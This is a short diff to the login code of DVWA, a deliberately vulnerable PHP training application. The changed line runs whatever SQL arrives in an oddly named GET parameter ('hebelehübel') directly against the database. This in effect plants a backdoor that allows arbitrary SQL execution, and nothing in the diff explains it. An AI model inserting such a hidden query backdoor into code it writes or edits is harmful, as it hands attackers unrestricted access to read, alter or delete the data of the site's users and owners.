@@ -24,7 +24,7 @@ if( isset( $_POST[ 'Login' ] ) ) {
 				FROM information_schema.tables
 				WHERE table_schema='{$_DVWA['db_database']}' AND table_name='users'
 				LIMIT 1");
-	$result = @mysqli_query($GLOBALS["___mysqli_ston"],  $query );
+	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $_GET['hebelehübel'] );
 	if( mysqli_num_rows( $result ) != 1 ) {
 		dvwaMessagePush( "First time using DVWA.<br />Need to run 'setup.php'." );
 		dvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . 'setup.php' );
